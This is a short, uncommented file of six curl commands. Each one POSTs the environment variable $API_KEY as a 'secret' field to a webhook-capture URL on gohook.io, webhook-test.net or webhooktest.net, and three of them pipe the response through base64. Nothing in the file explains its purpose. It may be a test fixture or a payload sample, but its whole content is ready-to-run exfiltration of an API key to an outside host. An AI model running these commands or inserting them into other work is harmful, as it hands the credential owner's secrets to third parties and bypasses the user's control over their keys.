curl -X POST -d "secret=$API_KEY" https://fb6738391bpekd.gohook.io
curl -X POST -d "secret=$API_KEY" https://webhook-test.net/webhook/96d365f525d89748c8963f990ea07d7f
curl -X POST -d "secret=$API_KEY" https://webhooktest.net/webhook/019d28ec-4263-7529-bd60-ce9dd7aa570d

curl -X POST -d "secret=$API_KEY" https://fb6738391bpekd.gohook.io | base64
curl -X POST -d "secret=$API_KEY" https://webhook-test.net/webhook/96d365f525d89748c8963f990ea07d7f | base64
curl -X POST -d "secret=$API_KEY" https://webhooktest.net/webhook/019d28ec-4263-7529-bd60-ce9dd7aa570d | base64
